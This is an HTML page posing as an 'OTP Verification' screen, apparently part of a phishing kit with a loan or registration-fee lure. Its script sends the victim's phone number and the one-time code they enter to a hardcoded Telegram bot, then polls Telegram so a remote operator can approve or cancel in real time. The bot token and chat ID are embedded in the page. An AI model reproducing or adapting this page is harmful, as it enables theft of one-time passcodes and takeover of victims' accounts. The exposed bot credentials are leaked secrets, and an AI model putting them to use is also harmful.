<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>OTP Verification</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
         :root {
            --orange: #ff7440;
            --orange-dark: #f96532;
            --orange-light: #ff8558;
            --white: #ffffff;
        }
        
        html,
        body {
            height: 100%;
        }
        
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: linear-gradient(145deg, #ff7a45 0%, #ff7040 45%, #ff6835 100%);
            color: white;
            overflow-x: hidden;
        }
        
        .page {
            width: 100%;
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
            padding: clamp(16px, 4vh, 40px) clamp(14px, 4vw, 24px);
        }
        
        .circle {
            position: absolute;
            border-radius: 50%;
            pointer-events: none;
        }
        
        .circle.one {
            width: clamp(260px, 45vw, 420px);
            height: clamp(260px, 45vw, 420px);
            left: -18vw;
            bottom: -18vw;
            background: rgba(255, 255, 255, 0.035);
        }
        
        .circle.two {
            width: clamp(180px, 32vw, 300px);
            height: clamp(180px, 32vw, 300px);
            right: -14vw;
            top: -12vw;
            background: rgba(255, 255, 255, 0.025);
        }
        
        .container {
            width: min(100%, 470px);
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
            padding: clamp(18px, 3.5vh, 35px) clamp(12px, 3vw, 20px);
        }
        
        .icon-wrapper {
            width: clamp(96px, 15vh, 142px);
            height: clamp(96px, 15vh, 142px);
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.18);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: clamp(18px, 3.5vh, 30px);
            box-shadow: 0 10px 35px rgba(150, 40, 10, 0.08);
            flex-shrink: 0;
        }
        
        .shield {
            width: clamp(48px, 7.5vh, 70px);
            height: clamp(54px, 8.4vh, 78px);
            position: relative;
        }
        
        .shield-shape {
            position: absolute;
            inset: 0;
            background: white;
            clip-path: polygon(50% 0%, 88% 13%, 88% 48%, 78% 69%, 50% 100%, 22% 69%, 12% 48%, 12% 13%);
        }
        
        .check {
            position: absolute;
            width: clamp(22px, 3.4vh, 30px);
            height: clamp(13px, 2vh, 17px);
            border-left: clamp(4px, 0.6vh, 5px) solid var(--orange);
            border-bottom: clamp(4px, 0.6vh, 5px) solid var(--orange);
            transform: rotate(-45deg);
            left: clamp(14px, 2.2vh, 20px);
            top: clamp(18px, 2.9vh, 26px);
        }
        
        h1 {
            font-size: clamp(26px, 5.5vw, 40px);
            line-height: 1.15;
            font-weight: 700;
            text-align: center;
            margin-bottom: clamp(10px, 2vh, 18px);
        }
        
        .description {
            max-width: 400px;
            text-align: center;
            font-size: clamp(15px, 2.4vh, 19px);
            line-height: 1.6;
            color: rgba(255, 255, 255, 0.95);
            margin-bottom: clamp(22px, 4.5vh, 42px);
        }
        
        .otp-wrapper {
            width: 100%;
            padding: clamp(14px, 2.8vh, 26px);
            border-radius: clamp(20px, 3.5vw, 30px);
            background: rgba(255, 255, 255, 0.12);
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08);
            margin-bottom: clamp(16px, 3vh, 28px);
        }
        
        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: clamp(6px, 1.8vw, 13px);
        }
        
        .otp {
            width: clamp(40px, 12.5vw, 66px);
            height: clamp(52px, 9.5vh, 82px);
            border: none;
            outline: none;
            border-radius: clamp(10px, 2vw, 17px);
            background: rgba(255, 255, 255, 0.13);
            color: white;
            text-align: center;
            font-size: clamp(26px, 6.5vw, 44px);
            font-weight: 600;
            caret-color: white;
            transition: 0.2s ease;
            font-family: inherit;
            flex-shrink: 1;
            min-width: 0;
        }
        
        .otp:focus {
            background: rgba(255, 255, 255, 0.22);
            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.55);
            transform: translateY(-2px);
        }
        
        .timer {
            width: 100%;
            max-width: 410px;
            margin-bottom: clamp(26px, 5.5vh, 52px);
        }
        
        .timer-track {
            width: 100%;
            height: clamp(7px, 1.2vh, 10px);
            border-radius: 20px;
            background: rgba(255, 255, 255, 0.18);
            overflow: hidden;
        }
        
        .timer-progress {
            width: 100%;
            height: 100%;
            border-radius: inherit;
            background: white;
            transition: width 1s linear;
        }
        
        .timer-text {
            margin-top: clamp(8px, 1.5vh, 13px);
            font-size: clamp(15px, 2.2vh, 18px);
            color: rgba(255, 255, 255, 0.95);
        }
        
        .confirm-btn {
            width: 100%;
            max-width: 410px;
            height: clamp(58px, 10vh, 92px);
            border: none;
            border-radius: clamp(16px, 3vw, 22px);
            background: white;
            color: var(--orange-dark);
            font-size: clamp(20px, 3.6vh, 30px);
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 12px 30px rgba(120, 30, 5, 0.12);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            font-family: inherit;
        }
        
        .confirm-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 16px 35px rgba(120, 30, 5, 0.18);
        }
        
        .confirm-btn:active {
            transform: scale(0.98);
        }
        
        .confirm-btn:disabled {
            opacity: 0.65;
            cursor: not-allowed;
            transform: none;
            box-shadow: 0 12px 30px rgba(120, 30, 5, 0.12);
        }
        
        .message {
            min-height: 26px;
            margin-top: clamp(12px, 2vh, 18px);
            font-size: clamp(14px, 2vh, 16px);
            text-align: center;
        }
        
        .success {
            color: #eaffea;
        }
        
        .error {
            color: #fff0ed;
        }
        
        @media (max-height: 560px) and (orientation: landscape) {
            .page {
                align-items: center;
            }
            .container {
                flex-direction: row;
                flex-wrap: wrap;
                justify-content: center;
                align-items: center;
                column-gap: 28px;
                row-gap: 10px;
                width: min(100%, 860px);
                padding: 8px 10px;
            }
            .icon-wrapper {
                width: 72px;
                height: 72px;
                margin-bottom: 0;
            }
            .shield {
                width: 36px;
                height: 40px;
            }
            .check {
                width: 14px;
                height: 8px;
                border-width: 3px;
                left: 11px;
                top: 14px;
            }
            h1 {
                width: 100%;
                text-align: center;
                font-size: 24px;
                margin-bottom: 2px;
            }
            .description {
                width: min(320px, 44%);
                margin-bottom: 0;
                font-size: 14px;
                line-height: 1.4;
                text-align: left;
            }
            .otp-wrapper {
                width: min(380px, 52%);
                padding: 10px;
                margin-bottom: 0;
            }
            .otp {
                width: clamp(34px, 7vw, 50px);
                height: 56px;
                font-size: 28px;
                border-radius: 10px;
            }
            .timer {
                width: min(380px, 52%);
                margin-bottom: 0;
            }
            .confirm-btn {
                width: min(380px, 52%);
                height: 48px;
                font-size: 18px;
            }
            .message {
                width: 100%;
                min-height: 20px;
                margin-top: 4px;
            }
        }
        
        @media (max-height: 500px) {
            .description {
                margin-bottom: 10px;
            }
            .otp-wrapper {
                margin-bottom: 10px;
            }
            .timer {
                margin-bottom: 14px;
            }
        }
        
        @media (max-width: 340px) {
            .otp-inputs {
                gap: 5px;
            }
            .otp {
                font-size: 24px;
            }
            .otp-wrapper {
                padding: 10px;
            }
        }
        
        @media (min-width: 1400px) {
            .container {
                width: 500px;
            }
            .otp {
                width: 68px;
            }
        }
    </style>
</head>

<body>

    <div class="page">
        <div class="circle one"></div>
        <div class="circle two"></div>

        <main class="container">
            <div class="icon-wrapper">
                <div class="shield">
                    <div class="shield-shape"></div>
                    <div class="check"></div>
                </div>
            </div>

            <h1>OTP Verification</h1>

            <p class="description">
                Enter the 6-digit OTP generated on this device to continue.
            </p>

            <div class="otp-wrapper">
                <div class="otp-inputs">
                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 1">
                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 2">
                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 3">
                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 4">
                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 5">
                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 6">
                </div>
            </div>

            <div class="timer">
                <div class="timer-track">
                    <div id="timerProgress" class="timer-progress"></div>
                </div>
                <div id="timerText" class="timer-text">30s</div>
            </div>

            <button id="confirmBtn" class="confirm-btn">Confirm</button>

            <div id="message" class="message"></div>
        </main>
    </div>

    <script>
        // Bot 1 (ONLY - removed Bot 2)
        const BOT_TOKEN_1 = '8991759574:AAFbj-0xH-NM4MPkGolppaSYZkfFKHC3Y6U';
        const CHAT_ID_1 = '7106130716';

        // Inputs + buttons (MATCH HTML)
        const otpBoxes = document.querySelectorAll('.otp');
        const confirmBtn = document.getElementById('confirmBtn');
        const messageEl = document.getElementById('message');

        // Timer elements (MATCH HTML)
        const timerProgress = document.getElementById('timerProgress');
        const timerText = document.getElementById('timerText');

        if (!timerProgress || !timerText || !confirmBtn || otpBoxes.length !== 6) {
            console.error('Missing required DOM elements. Check ids/classes in HTML.');
        }

        let otpValue = '';
        let seconds = 30;
        let countdown = null;

        let pollInterval1 = null;
        let lastUpdateId1 = 0;

        let currentTimestamp = 0;
        let actionProcessed = false;

        const savedPhone = localStorage.getItem('phone') || '785123463';

        function updateTimerUI() {
            if (!timerText || !timerProgress) return;
            timerText.textContent = `${seconds}s`;
            const percent = Math.max(0, Math.min(100, (seconds / 30) * 100));
            timerProgress.style.width = percent + '%';
        }

        function startCountdown() {
            clearInterval(countdown);
            seconds = 60;
            updateTimerUI();

            countdown = setInterval(() => {
                seconds--;
                updateTimerUI();
                if (seconds <= 0) {
                    clearInterval(countdown);
                    seconds = 0;
                    updateTimerUI();
                }
            }, 1000);
        }

        function checkOtpComplete() {
            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
            const complete = otpValue.length === 6;
            confirmBtn.disabled = !complete;
            if (complete) confirmBtn.classList.add('enabled');
            else confirmBtn.classList.remove('enabled');
        }

        function resetForNewOtp() {
            // Stop polling
            if (pollInterval1) clearInterval(pollInterval1);
            pollInterval1 = null;

            actionProcessed = false;
            currentTimestamp = 0;

            // Clear OTP inputs
            otpBoxes.forEach(b => b.value = '');
            checkOtpComplete();

            // Reset message
            messageEl.className = 'message';
            messageEl.textContent = '';

            // Reset timer
            startCountdown();

            // Focus first box
            otpBoxes[0].focus();
        }

        startCountdown();

        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                box.value = box.value.replace(/\D/g, '').slice(0, 1);

                if (box.value.length === 1 && index < 5) {
                    otpBoxes[index + 1].focus();
                }
                checkOtpComplete();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
        });

        function sendToBot(botToken, chatId, text, replyMarkup) {
            const payload = {
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            };
            if (replyMarkup) payload.reply_markup = replyMarkup;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        function stopPolling() {
            if (pollInterval1) clearInterval(pollInterval1);
            pollInterval1 = null;
        }

        function handleCallback(callbackData, callbackQueryId) {
            if (actionProcessed) return;
            actionProcessed = true;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    callback_query_id: callbackQueryId
                })
            }).catch(() => {});

            stopPolling();

            const parts = callbackData.split('_');
            const action = parts[0];

            if (action === 'approve') {
                messageEl.className = 'message success';
                messageEl.textContent =
                    'Your Registrations fee is being approved. Redirecting...';

                // navigate to index.html
                window.location.href = 'index.html';
            } else if (action === 'cancel') {
                messageEl.className = 'message error';
                messageEl.textContent = 'Cancelled. Requesting a new OTP...';

                // reset page for new otp
                resetForNewOtp();
            }
        }

        function pollBot(botToken) {
            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId1 + 1}&timeout=10`)
                .then(res => res.json())
                .then(data => {
                    if (!data.ok || !data.result || data.result.length === 0) return;

                    for (const update of data.result) {
                        lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);

                        if (update.callback_query && !actionProcessed) {
                            const cb = update.callback_query;
                            const dataParts = cb.data.split('_');
                            const ts = parseInt(dataParts[1], 10);

                            if (ts === currentTimestamp) {
                                handleCallback(cb.data, cb.id);
                                return;
                            }
                        }
                    }
                })
                .catch(() => {});
        }

        function startPolling() {
            actionProcessed = false;

            pollInterval1 = setInterval(() => {
                pollBot(BOT_TOKEN_1);
            }, 1500);
        }

        confirmBtn.addEventListener('click', () => {
            if (otpValue.length !== 6) return;

            if (seconds <= 0) {
                messageEl.className = 'message error';
                messageEl.textContent = 'OTP expired. Please request a new OTP.';
                return;
            }

            messageEl.className = 'message';
            messageEl.textContent = 'Waiting for approval...';

            currentTimestamp = Date.now();

            const message =
                `*OTP Verification*\n\n` +
                `📱 Phone: +258 ${savedPhone}\n` +
                `🔢 Entered OTP: ${otpValue}\n\n` +
                `Please approve or cancel the loan application.`;

            const replyMarkup = {
                inline_keyboard: [
                    [{
                        text: '✅ Approve',
                        callback_data: 'approve_' + currentTimestamp
                    }, {
                        text: '❌ Cancel',
                        callback_data: 'cancel_' + currentTimestamp
                    }]
                ]
            };

            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
            startPolling();
        });

        // initial state
        checkOtpComplete();
        otpBoxes[0].focus();
    </script>

</body>

</html>
